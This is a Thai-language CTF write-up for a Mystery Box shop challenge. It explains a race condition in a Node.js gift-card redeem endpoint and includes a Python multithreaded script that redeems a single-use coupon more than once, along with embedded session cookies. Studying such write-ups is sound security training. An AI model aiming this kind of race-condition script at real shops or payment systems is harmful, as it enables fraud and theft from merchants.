> เจ้าของร้าน Mystery Box เจอแฮกเกอร์ใช้คูปอง Gift Card ที่ควรใช้ครั้งเดียวต่อบัญชี หลังจากการสมัครครั้งแรกได้หลายรอบ ทำให้กล่องสุ่มดิจิตัล Mystery Box ถูกขโมยไปหลายกล่อง ในฐานะ Penetration Tester จงหาวิธีที่แฮกเกอร์ใช้ในการขโมยสินค้าและลองทำดู
> 
> 
> URL เว็บโจทย์ (มี Flag): [https://wtctt24.open.web2.p7z.pw](https://wtctt24.open.web2.p7z.pw/)
> 
> โค้ดเว็บ (ไม่มี Flag): https://static.wtctt24.p7z.pw/open_web2.zip
> 
> หมายเหตุ:
> 
> - สมัครเสร็จ กด Reset Balance ก่อนหนึ่งรอบ
> - คูปองสำหรับ Redeem Gift Card คือ WTCTT2024GIFT มูลค่า $1000
> - สามารถพบ Flag ได้ข้างใน Mystery Box
> - สามารถกดปุ่ม Reset Balance เพื่อรีเซท Balance และ Gift Card เมื่อกดปุ่ม Reset ให้ทำการรีเฟรชหน้าจอเพื่ออัปเดตข้อมูล
> - Flag จะอยู่ในรูปแบบ flag{open_webX_XXX} เช่น flag{open_web1_e758148af358200bf364c8d9282b7f04}
> - ช่องโหว่ไม่จำเป็นต้องทำ Port Scan ด้วย Nmap
> - ช่องโหว่ไม่จำเป็นต้องทำ URL Fuzzing เพื่อหา Directory หรือ File ที่เป็นชื่อลับ
> - โจทย์ไม่ได้ถูกออกแบบมาให้แก้ไข โดยใช้โปรแกรมสแกนช่องโหว่อัตโนมัติ

เปิดหน้าเว็บมา จะเจอหน้า login ให้ทำการสมัคร user ให้เรียบร้อยก่อน

![image](https://github.com/user-attachments/assets/caeac996-d6d1-4574-8266-4f1ec050970a)

![image](https://github.com/user-attachments/assets/f672d18c-1a0b-4a8a-a90c-8984a08f2adc)

register เสร็จแล้ว ให้ทำการ login จะเจอ popup ให้ redeem gift card code ให้ปิดไปก่อนแล้วกด reset balance ที่มุมขวาบน

![image](https://github.com/user-attachments/assets/e5d10bc9-86cd-46e4-b2f3-319defa727c9)

![image](https://github.com/user-attachments/assets/03f00555-bdd2-4d03-b3e3-c6bc300cbb58)

จากตรงนี้ โดนงูฉกตายหนึ่ง เพราะเกือบหาที่ redeem ใหม่ไม่เจอ เพราะมันอยู่ตรงแถบซ้ายมือข้างๆ Mystery Box ให้กดตรงนั้นแล้วเอาโค้ด WTCTT2024GIFT ที่โจทย์ให้มาใส่ไปได้เลย เสร็จแล้วรีเฟรช เราจะได้ตังมา 1000 บาท

![image](https://github.com/user-attachments/assets/5c96bcf1-750a-4217-9855-8a753b6ab6d8)

![image](https://github.com/user-attachments/assets/679532c5-a87d-4525-bb73-9f6f585717b4)

![image](https://github.com/user-attachments/assets/b1720511-5145-485b-a1e7-cec631d5e931)

นอกจากนี้ยังมี source code มาให้เราอ่านด้วย ทีนี้เรามาลองอ่านโค้ดดูว่าทำอะไรได้บ้าง

```javascript
app.post('/redeem', (req, res) => {
    if (!req.session.user) {
        return res.status(401).json({ success: false, message: 'User not logged in' });
    }

    const { code } = req.body;

    if (!code) {
        return res.status(400).json({ success: false, message: 'Gift card code is required.' });
    }


    const checkSql = 'SELECT * FROM giftcardcode WHERE code = ?';
    connection.query(checkSql, [code], (err, results) => {
        if (err) {
            console.error('Error querying the database:', err.stack);
            return res.status(500).json({ success: false, message: 'Database error.' });
        }

        if (results.length === 0) {
            return res.status(404).json({ success: false, message: 'Gift card code not found.' });
        }

        const giftCard = results[0];

        if (giftCard.used === 1) {
            return res.status(400).json({ success: false, message: 'This gift card has already been redeemed.' });
        }


        const redeemSql = 'UPDATE giftcardcode SET used = 1 WHERE code = ?';
        connection.query(redeemSql, [code], (err, updateResult) => {
            if (err) {
                console.error('Error updating gift card status:', err.stack);
                return res.status(500).json({ success: false, message: 'Error updating gift card status.' });
            }

            const updateBalanceSql = 'UPDATE users SET balance = balance + 1000 WHERE username = ?';
            connection.query(updateBalanceSql, [req.session.user.username], (err, balanceResult) => {
                if (err) {
                    console.error('Error updating user balance:', err.stack);
                    return res.status(500).json({ success: false, message: 'Error updating user balance.' });
                }

                return res.status(200).json({ success: true, message: 'Gift card redeemed successfully! Balance updated.' });
            });
        });
    });
});
```

คร่าวๆ ก็คือตัวเว็บมีการตรวจสอบการใช้โค้ดว่าใช้ไปแล้วหรือไม่ ซึ่งถ้าเรามาดูโค้ด 2 ส่วนนี้ คือจังหวะที่เช็คโค้ดกับอัพเดทโค้ดจะมี gap เวลาห่างกันระหว่างขั้นตอน

```javascript
// time to check used code
const checkSql = 'SELECT * FROM giftcardcode WHERE code = ?';
    connection.query(checkSql, [code], (err, results) => {

...[SNIP]...

// time to use code
           const updateBalanceSql = 'UPDATE users SET balance = balance + 1000 WHERE username = ?';
            connection.query(updateBalanceSql, [req.session.user.username], (err, balanceResult) => {
```

ซึ่งหากพิจารณาแล้ว มันก็มากพอที่ attacker จะใช้จังหวะนี้ในการโจมตีเพื่อเบิ้ล redeem code ซ้ำก่อนที่จะไป update ว่าโค้ดถูกใช้แล้ว ใช่ฮะ เรากำลังพูดถึงการทำ Race Condition ซึ่งมีผลทำให้คูปองที่ควรจะถูกใช้ครั้งเดียว สามารถนำไปใช้ได้หลายครั้ง
แต่ครั้นลองกดมือใน repeater แล้ว แถมพอใช้ Burp Comm ก็ช้าจนไม่ทันกิน (แต่ตอนแข่งเสือกฟลุ๊ค กดทันเฉย งงมาก) ก็เลยเขียนโค้ดให้ยิง race condition ออกมา

```python
import requests
import threading

# Define the target URL and headers
url = "http://wtctt24.open.web2.p7z.pw/redeem"
headers = {
    "Host": "wtctt24.open.web2.p7z.pw",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "http://wtctt24.open.web2.p7z.pw/main.html",
    "Content-Type": "application/json",
    "Origin": "http://wtctt24.open.web2.p7z.pw",
    "Connection": "keep-alive",
    "Cookie": "cf_clearance=LKH6IaUbLFTApls.aoGWXIHLHs3BbGQvmDUUm6XWSsY-1736704248-1.2.1.1-5BlLWedtCnQ8GXXltnmGQAeseE_gIG6qMgM7nRF_hX_3IG6KJcKaa98N_BbuzjV78r5awtQxKfiYILVRa9caqlu_bVBaWk_2r3KIQC7KGM5kvCIb2ProMZK2WLJ5SWnyLYm7XyD5hzxyaFDKY0PneRMpNzUW4k7Upa.BQ3t0UqXa_IygzXSc9nq2AaDO0ZaxfH.CLwKxAZEV_giwiaxvZlFIHQsiML8x4ky_mR8XlqCoOj7srM6dmsLl8xtmJvbZI.ck2_Qcv3Nyysy3J4rzUSjkd3xiIUlTGc9p45j_f9c; connect.sid=s%3Azthg7VXcLwmBW4OGSXYFzwBMoXH67kEX.Ic9rUrPueoVt2a8h2%2FnTwQzFB6Glt1YoJGjekKyfmk0",
    "Priority": "u=0"
}

# Define the payload
payload = {"code": "WTCTT2024GIFT"}

# Shared success counter
success_count = 0
lock = threading.Lock()

# Function to send a single request
def redeem_code():
    global success_count
    try:
        response = requests.post(url, headers=headers, json=payload)
        if response.status_code == 200 and "success" in response.text.lower():
            with lock:
                success_count += 1
        print(f"Response: {response.status_code}, {response.text}")
    except Exception as e:
        print(f"Error: {e}")

# Number of concurrent threads
threads = []
thread_count = 10

# Start multiple threads to exploit the race condition
for _ in range(thread_count):
    thread = threading.Thread(target=redeem_code)
    threads.append(thread)
    thread.start()

# Wait for all threads to complete
for thread in threads:
    thread.join()

# Print result
print(f"Exploitation complete: {success_count} out of {thread_count} attempts succeeded.")
```

ได้โค้ดแล้วก็กดยิงสคริป ก็ได้ปึ้ง เราสามารถ redeem code ได้ 2 ครั้ง กลับไปหน้าเว็บ กด refresh เราก็จะได้ 2000 บาทมาเปิดกล่องสุ่มเอา flag แล้ว

![image](https://github.com/user-attachments/assets/d7e08279-542c-4dc7-813a-b909ea2d5384)

![image](https://github.com/user-attachments/assets/93074516-c8f3-4a1d-ab2d-ff8277688f97)

![image](https://github.com/user-attachments/assets/f37d5d81-3dd1-4702-9906-ca93fb819dc8)
